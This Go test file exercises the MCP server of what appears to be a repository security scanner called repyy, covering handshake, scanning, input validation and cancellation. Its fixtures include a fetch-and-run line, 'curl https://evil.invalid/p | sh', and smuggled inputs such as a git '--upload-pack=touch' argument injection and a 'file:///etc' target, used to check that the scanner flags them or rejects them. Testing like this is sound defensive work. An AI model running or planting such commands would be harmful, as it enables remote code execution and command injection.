package app

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"io"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"testing"

	"github.com/Kevin-Umali/repyy/internal/model"
)

type mcpReply struct {
	ID     json.RawMessage `json:"id"`
	Result json.RawMessage `json:"result"`
	Error  *rpcError       `json:"error"`
}

func runMCPSession(t *testing.T, messages ...string) []mcpReply {
	t.Helper()
	var stdout bytes.Buffer
	code, err := runMCP(nil, strings.NewReader(strings.Join(messages, "\n")+"\n"), &stdout, "test")
	if err != nil || code != 0 {
		t.Fatalf("code=%d err=%v", code, err)
	}
	var replies []mcpReply
	lines := bufio.NewScanner(&stdout)
	lines.Buffer(nil, mcpMessageLimit)
	for lines.Scan() {
		var reply mcpReply
		if err := json.Unmarshal(lines.Bytes(), &reply); err != nil {
			t.Fatalf("stdout line is not JSON-RPC: %v\n%s", err, lines.Text())
		}
		replies = append(replies, reply)
	}
	idOrErrorFirst := func(r mcpReply) int {
		n, err := strconv.Atoi(string(r.ID))
		if err != nil {
			return -1
		}
		return n
	}
	sort.SliceStable(replies, func(i, j int) bool { return idOrErrorFirst(replies[i]) < idOrErrorFirst(replies[j]) })
	return replies
}

func callTool(id int, name string, arguments any) string {
	data, _ := json.Marshal(map[string]any{"jsonrpc": "2.0", "id": id, "method": "tools/call", "params": map[string]any{"name": name, "arguments": arguments}})
	return string(data)
}

func TestMCPHandshakeListAndScan(t *testing.T) {
	t.Setenv("REPYY_CACHE_DIR", t.TempDir())
	root := t.TempDir()
	if err := os.WriteFile(filepath.Join(root, "payload.sh"), []byte("curl https://evil.invalid/p | sh\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	replies := runMCPSession(t,
		`{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"test","version":"1"}}}`,
		`{"jsonrpc":"2.0","method":"notifications/initialized"}`,
		`{"jsonrpc":"2.0","id":2,"method":"tools/list"}`,
		callTool(3, "scan_repository", map[string]any{"target": root, "max_findings": 1}),
		callTool(4, "explain_rule", map[string]any{"rule_id": "EXEC-001"}),
		`{"jsonrpc":"2.0","id":5,"method":"ping"}`,
	)
	if len(replies) != 5 {
		t.Fatalf("want 5 replies (notification unanswered), got %d", len(replies))
	}

	var initialize struct {
		ProtocolVersion string         `json:"protocolVersion"`
		Capabilities    map[string]any `json:"capabilities"`
		ServerInfo      struct{ Name string }
	}
	mustUnmarshal(t, replies[0].Result, &initialize)
	if initialize.ProtocolVersion != "2025-06-18" || initialize.Capabilities["tools"] == nil || initialize.ServerInfo.Name != "repyy" {
		t.Fatalf("initialize: %s", replies[0].Result)
	}

	var list struct{ Tools []struct{ Name string } }
	mustUnmarshal(t, replies[1].Result, &list)
	if len(list.Tools) != 2 || list.Tools[0].Name != "scan_repository" || list.Tools[1].Name != "explain_rule" {
		t.Fatalf("tools/list: %s", replies[1].Result)
	}

	var scanCall struct {
		Content           []mcpContent
		StructuredContent mcpScanResult
		IsError           bool
	}
	mustUnmarshal(t, replies[2].Result, &scanCall)
	scan := scanCall.StructuredContent
	if scanCall.IsError || scan.Verdict != "DO NOT RUN" || !scan.CoverageComplete || !scan.ExceedsFailOn || len(scan.TopFindings) != 1 || scan.FindingsOmitted == 0 || scan.TopFindings[0].Severity != "critical" {
		t.Fatalf("scan_repository: %s", replies[2].Result)
	}
	if len(scanCall.Content) != 1 || !json.Valid([]byte(scanCall.Content[0].Text)) {
		t.Fatalf("scan_repository text content must be JSON: %+v", scanCall.Content)
	}

	var explain struct {
		StructuredContent struct{ ID, Category string }
		IsError           bool
	}
	mustUnmarshal(t, replies[3].Result, &explain)
	if explain.IsError || explain.StructuredContent.ID != "EXEC-001" || explain.StructuredContent.Category != "dynamic-execution" {
		t.Fatalf("explain_rule: %s", replies[3].Result)
	}
	if string(replies[4].ID) != "5" || replies[4].Error != nil {
		t.Fatalf("ping: %+v", replies[4])
	}
}

func TestMCPNegotiatesUnknownProtocolVersion(t *testing.T) {
	replies := runMCPSession(t, `{"jsonrpc":"2.0","id":"a","method":"initialize","params":{"protocolVersion":"1999-01-01"}}`)
	var initialize struct{ ProtocolVersion string }
	mustUnmarshal(t, replies[0].Result, &initialize)
	if string(replies[0].ID) != `"a"` || initialize.ProtocolVersion != mcpProtocolVersions[0] {
		t.Fatalf("initialize: %+v", replies[0])
	}
}

func TestMCPRejectsMalformedMessages(t *testing.T) {
	replies := runMCPSession(t,
		`{not json`,
		`[{"jsonrpc":"2.0","id":1,"method":"ping"}]`,
		`{"jsonrpc":"1.0","id":2,"method":"ping"}`,
		`{"jsonrpc":"2.0","id":3,"method":"resources/list"}`,
		`{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"run_shell"}}`,
		`{"jsonrpc":"2.0","id":5,"method":"tools/call","params":"x"}`,
	)
	want := []int{rpcParseError, rpcInvalidRequest, rpcInvalidRequest, rpcMethodNotFound, rpcInvalidParams, rpcInvalidParams}
	if len(replies) != len(want) {
		t.Fatalf("want %d replies, got %d", len(want), len(replies))
	}
	for i, code := range want {
		if replies[i].Error == nil || replies[i].Error.Code != code {
			t.Errorf("message %d: got %+v, want error %d", i, replies[i], code)
		}
	}
}

func TestMCPToolInputsAreValidated(t *testing.T) {
	t.Setenv("REPYY_CACHE_DIR", t.TempDir())
	replies := runMCPSession(t,
		callTool(1, "scan_repository", map[string]any{}),
		callTool(2, "scan_repository", map[string]any{"target": "--upload-pack=touch /tmp/x"}),
		callTool(3, "scan_repository", map[string]any{"target": "/tmp\nx"}),
		callTool(4, "scan_repository", map[string]any{"target": "/tmp", "command": "id"}),
		callTool(5, "scan_repository", map[string]any{"target": "/tmp", "fail_on": "severe"}),
		callTool(6, "scan_repository", map[string]any{"target": "/tmp", "max_findings": 500}),
		callTool(7, "scan_repository", map[string]any{"target": "file:///etc"}),
		callTool(8, "explain_rule", map[string]any{"rule_id": "NOPE-999"}),
	)
	for i, reply := range replies {
		var result mcpToolResult
		mustUnmarshal(t, reply.Result, &result)
		if !result.IsError || len(result.Content) != 1 || result.Content[0].Text == "" {
			t.Errorf("call %d: want tool error, got %s", i+1, reply.Result)
		}
	}
}

func TestMCPAnswersAfterOversizedLine(t *testing.T) {
	replies := runMCPSession(t,
		`{"jsonrpc":"2.0","id":1,"method":"ping","params":{"pad":"`+strings.Repeat("x", mcpMessageLimit)+`"}}`,
		`{"jsonrpc":"2.0","id":2,"method":"ping"}`,
	)
	if len(replies) != 2 || replies[0].Error == nil || replies[0].Error.Code != rpcParseError || string(replies[0].ID) != "null" {
		t.Fatalf("oversized line: %+v", replies)
	}
	if string(replies[1].ID) != "2" || replies[1].Error != nil {
		t.Fatalf("request after oversized line: %+v", replies[1])
	}
}

// blockedMCPSession runs a server whose scans block until release is closed or
// the call is cancelled, and returns a function that reads one reply.
func blockedMCPSession(t *testing.T) (send func(string), next func() mcpReply, scanStarted <-chan struct{}, release chan<- struct{}) {
	t.Helper()
	started, unblock := make(chan struct{}, 4), make(chan struct{})
	server := mcpServer{opts: scanArgs{failOn: "high"}, version: "test", scan: func(ctx context.Context, opts scanArgs) (model.Report, string, error) {
		started <- struct{}{}
		select {
		case <-unblock:
		case <-ctx.Done():
			return model.Report{}, "", ctx.Err()
		}
		return model.Report{Results: []model.RepoResult{{Target: opts.targets[0], Verdict: model.VerdictNoFindings, Coverage: model.Coverage{Complete: true}}}}, "", nil
	}}
	stdinReader, stdinWriter := io.Pipe()
	stdoutReader, stdoutWriter := io.Pipe()
	served := make(chan error, 1)
	go func() {
		served <- server.serve(context.Background(), stdinReader, stdoutWriter)
		stdoutWriter.Close()
	}()
	t.Cleanup(func() {
		stdinWriter.Close()
		if err := <-served; err != nil {
			t.Errorf("serve: %v", err)
		}
	})
	lines := bufio.NewScanner(stdoutReader)
	send = func(message string) {
		if _, err := io.WriteString(stdinWriter, message+"\n"); err != nil {
			t.Fatal(err)
		}
	}
	next = func() mcpReply {
		if !lines.Scan() {
			t.Fatalf("no reply: %v", lines.Err())
		}
		var reply mcpReply
		mustUnmarshal(t, lines.Bytes(), &reply)
		return reply
	}
	return send, next, started, unblock
}

func TestMCPAnswersPingDuringScan(t *testing.T) {
	send, next, started, release := blockedMCPSession(t)
	send(callTool(1, "scan_repository", map[string]any{"target": "/repo"}))
	<-started
	send(`{"jsonrpc":"2.0","id":2,"method":"ping"}`)
	if reply := next(); string(reply.ID) != "2" || reply.Error != nil {
		t.Fatalf("ping during scan: %+v", reply)
	}
	close(release)
	var result mcpToolResult
	reply := next()
	mustUnmarshal(t, reply.Result, &result)
	if string(reply.ID) != "1" || result.IsError {
		t.Fatalf("scan reply: %+v %s", reply, reply.Result)
	}
}

func TestMCPCancelledCallGetsNoResponse(t *testing.T) {
	send, next, started, _ := blockedMCPSession(t)
	send(callTool(1, "scan_repository", map[string]any{"target": "/repo"}))
	<-started
	send(`{"jsonrpc":"2.0","method":"notifications/cancelled","params":{"requestId":1,"reason":"user"}}`)
	send(callTool(2, "explain_rule", map[string]any{"rule_id": "EXEC-001"}))
	if reply := next(); string(reply.ID) != "2" {
		t.Fatalf("want only the explain_rule reply, got %+v", reply)
	}
}

func TestMCPRejectsTargetsOnCommandLine(t *testing.T) {
	if code, err := runMCP([]string{"."}, strings.NewReader(""), &bytes.Buffer{}, "test"); code != 3 || err == nil {
		t.Fatalf("code=%d err=%v", code, err)
	}
}

func mustUnmarshal(t *testing.T, data []byte, into any) {
	t.Helper()
	if err := json.Unmarshal(data, into); err != nil {
		t.Fatalf("unmarshal %s: %v", data, err)
	}
}
